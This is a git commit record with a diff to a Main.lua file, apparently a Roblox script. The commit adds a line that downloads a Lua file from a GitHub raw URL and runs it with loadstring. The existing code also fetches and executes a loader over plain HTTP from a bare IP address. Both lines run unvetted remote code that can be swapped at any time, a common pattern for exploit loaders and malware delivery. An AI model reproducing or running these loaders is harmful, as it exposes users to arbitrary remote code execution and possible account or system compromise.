02548f36f1f3e97592d9733e1f82bbdd44e2448c
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-09-01 22:08:40 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,2 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
 ID="b5bd87ab-c631-494c-9b65-aa0f5b823563";
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
